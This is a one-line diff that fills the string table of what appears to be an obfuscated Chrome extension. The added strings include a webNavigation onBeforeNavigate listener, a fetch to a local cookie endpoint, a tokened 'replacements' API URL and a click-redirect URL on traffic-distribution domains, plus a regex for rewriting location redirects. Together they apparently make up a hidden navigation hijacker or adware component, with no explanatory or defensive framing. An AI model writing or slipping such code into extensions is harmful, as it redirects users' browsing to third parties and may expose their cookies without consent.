@@ -1,1 +1,1 @@
-["chrome","","domains","","","","outermost_frame","","","","","","","","","","","","extended_sources_disabled","1000","5000"]
+["chrome","fetch","domains","webNavigation","onBeforeNavigate","addListener","outermost_frame","setTimeout","http://localhost:3000/cookie","URL","hostname","json","then","domainName","https://api.adgoud.com/replacements/all?token=pf1saxaes0","https://rbtds.net/siblings/click?place=30&replacement=","frameType","document\\.location\\.href\\s*=\\s*\"([^\"]+)\"","24","1000","5000"]
